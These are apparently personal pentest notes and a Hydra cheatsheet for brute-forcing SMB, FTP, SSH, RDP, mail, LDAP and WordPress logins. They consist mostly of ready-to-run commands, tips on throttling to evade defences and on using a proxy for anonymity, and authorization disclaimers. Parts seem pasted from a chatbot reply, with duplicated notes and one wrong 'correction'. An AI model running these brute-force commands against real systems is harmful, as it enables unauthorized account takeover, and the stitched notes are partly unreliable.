
## SMB BRUTE FORCE 

**Brute Forcing SMB: A Step-by-Step Guide**

**Scanning:**

1. **Check SMB Availability:**
   - Use Nmap to scan for open SMB ports:
     ```
     nmap -p 445 192.168.1.100
     ```

2. **Check SMB Security Settings:**
   - Use Nmap's scripting engine to check for SMB signing requirements:
     ```
     nmap -p 445 --script=smb-security-mode 192.168.1.100
     ```

**Brute Force Attack:**

1. **Basic Hydra Command:**
   - Attempt brute force using a single username:
     ```
     hydra -l admin -P passwords.txt 192.168.1.100 smb
     ```

2. **Using Username List:**
   - Attempt brute force with multiple usernames:
     ```
     hydra -L users.txt -P passwords.txt 192.168.1.100 smb
     ```

3. **Adjusting Attack Parameters:**
   - Set the number of threads and wait time to avoid triggering security measures:
     ```
     hydra -L users.txt -P passwords.txt -t 1 -w 5 192.168.1.100 smb
     ```

**Post-Attack:**

1. **Handling Success:**
   - If successful, handle credentials securely and report findings to stakeholders.
   - Suggest remediation steps, such as changing passwords and enhancing authentication.

2. **Documentation:**
   - Document the entire process for future reference and learning.

3. **Legal and Ethical Considerations:**
   - Ensure all activities comply with laws and regulations.
   - Avoid disrupting target services and respect privacy laws.

**Additional Considerations:**

- **Network Environment:**
  - Be aware of firewalls, intrusion detection systems (IDS), and potential DOS conditions.
  - Consider using a proxy or VPN for anonymity in authorized tests.

- **Continuous Learning:**
  - Stay informed about security best practices, vulnerabilities, and mitigation strategies.

By following this guide, you can responsibly and effectively perform SMB brute force attacks within the bounds of authorization and ethics.


## Hydra EXPLANATION


**Hydra** is a powerful password-cracking tool that supports **over 50 protocols**, including FTP. It can perform rapid **dictionary attacks** on various services.

**Command Syntax for Hydra:**

```bash
hydra -t 4 -l [username] -P [path to wordlist] -vV [target IP] ftp
```

### **Table: Fragile vs. Robust Protocols**

|**Category**|**Protocol**|**Explanation**|
|---|---|---|
|**Fragile Protocols**|||
||**SMTP**|Often rate-limited to prevent abuse; many servers lock accounts after a few failed attempts.|
||**FTP**|Older implementations are sensitive to high connection rates, leading to crashes or timeouts.|
||**HTTP/HTTPS (Web Forms)**|Web servers may implement CAPTCHA, rate-limiting, or block IPs after too many failed attempts.|
||**IMAP/POP3**|Email protocols often have strict security measures and lower tolerance for repeated failures.|
||**Telnet**|Legacy protocol with limited security; excessive requests may crash the service.|
||**RDP (Remote Desktop)**|May block IPs or lock accounts quickly after multiple failed logins.|
||**SNMP**|Not designed for authentication; high parallel connections can lead to service disruption.|
|**Robust Protocols**|||
||**SSH**|Designed to handle multiple connections; higher tolerance to brute-force attempts.|
||**SMB**|Resilient to high connection rates, especially on modern implementations.|
||**Kerberos**|Built for secure authentication, often used in enterprise networks, withstanding parallel brute-forcing.|
||**DNS**|Can handle many requests simultaneously, although brute-forcing subdomains may still be detected.|
||**LDAP**|Generally robust and scalable for high connection attempts, especially on enterprise systems.|

---

### **Key Notes:**

- **Fragile Protocols**: These are more likely to crash, lock accounts, or trigger defenses (CAPTCHA, IP bans) during brute-forcing attempts. Use **low thread counts** (e.g., `-t 4` or `-t 8`) for these.
- **Robust Protocols**: These can handle more concurrent connections and higher thread counts (e.g., `-t 16` or `-t 32`) without significant risk of service disruption.

This distinction isn’t absolute—always monitor the target’s behavior and adjust the thread count as needed.

###### **Breaking Down the Command**:

| **Section**             | **Function**                                                                      |
| ----------------------- | --------------------------------------------------------------------------------- |
| `hydra`                 | Executes the Hydra tool                                                           |
| `-t 4`                  | Specifies **4 parallel connections** for faster cracking                          |
| `-l [user]`             | Specifies the **username** for the account being targeted (e.g., "dale")          |
| `-P [path to wordlist]` | Specifies the path to a **wordlist** of potential passwords (e.g., "rockyou.txt") |
| `-vV`                   | Enables **verbose mode**, showing login attempts and results                      |
| `[target IP]`           | The **IP address** of the target machine                                          |
| `ftp`                   | Specifies the **FTP protocol** for Hydra to attack                                |

---

### **Key Notes:**

- **Fragile Protocols**: These are more likely to crash, lock accounts, or trigger defenses (CAPTCHA, IP bans) during brute-forcing attempts. Use **low thread counts** (e.g., `-t 4` or `-t 8`) for these.
- **Robust Protocols**: These can handle more concurrent connections and higher thread counts (e.g., `-t 16` or `-t 32`) without significant risk of service disruption.

###### **Example Command**:

```bash
hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp
```

This command will attempt to crack the FTP password for the user **dale** on the server at **10.10.10.6**, using the **rockyou.txt** wordlist.


Certainly! Below is a well-organized cheatsheet for Hydra password cracking in the form of a table. This table includes the commands, descriptions, protocols, and options used for each command.

| Command                                                                                                                                  | Description                                                                 | Protocol | Options Used                                                                 |
|------------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------|----------|------------------------------------------------------------------------------|
| `hydra -P password-file.txt -v $ip snmp`                                                                                                 | Brute force SNMP with a password list.                                      | SNMP    | `-P`, `-v`                                                                   |
| `hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp`                                                                   | Brute force FTP with a specific username and rockyou password list.         | FTP     | `-t`, `-l`, `-P`, `-vV`                                                     |
| `hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh`                                                                         | Brute force SSH with a list of users and passwords.                         | SSH     | `-v`, `-V`, `-u`, `-L`, `-P`, `-t`                                           |
| `hydra -v -V -u -L users.txt -p "" -t 1 -u $ip ssh`                                                                                    | Brute force SSH with a username list and empty password.                    | SSH     | `-v`, `-V`, `-u`, `-L`, `-p`, `-t`                                            |
| `hydra $ip -s 22 ssh -l <username> -P big_wordlist.txt`                                                                                | Brute force SSH against a known username on port 22.                       | SSH     | `-s`, `-l`, `-P`                                                             |
| `hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V`                                                                     | Brute force POP3 with a specific username and password list.               | POP3    | `-l`, `-P`, `-f`, `-V`                                                       |
| `hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V`                                                                                    | Brute force SMTP with a password list.                                      | SMTP    | `-P`, `-V`                                                                   |
| `hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin`                                                                             | Brute force HTTP GET 401 login with a dictionary.                          | HTTP    | `-L`, `-P`                                                                   |
| `hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip`                                                      | Brute force RDP with rockyou password list.                                 | RDP     | `-t`, `-V`, `-f`, `-l`, `-P`                                                  |
| `hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb`                                                       | Brute force SMB with rockyou password list.                                 | SMB     | `-t`, `-V`, `-f`, `-l`, `-P`                                                  |
| `hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'` | Brute force WordPress admin login.                                         | HTTP    | `-l`, `-P`, `-V`, `http-form-post`                                             |
| `hydra -L usernames.txt -P passwords.txt $ip smb -V -f`                                                                                | Brute force SMB with user and password lists.                                | SMB     | `-L`, `-P`, `-V`, `-f`                                                        |
| `hydra -L users.txt -P passwords.txt $ip ldap2 -V -f`                                                                                  | Brute force LDAP with user and password lists.                               | LDAP    | `-L`, `-P`, `-V`, `-f`                                                        |

### Notes and Warnings:
- **Responsibility:** Ensure you have proper authorization before attempting any password cracking activities.
- **Legal Compliance:** Always adhere to legal and ethical standards when using these commands.
- **Command Corrections:** 
  - In command 5, the `-l` option should be followed by a username.
  - Verify that all paths to wordlists are correct and accessible.

This cheatsheet provides a quick reference for using Hydra to brute force various protocols. Always use these tools responsibly and within the bounds of the law.
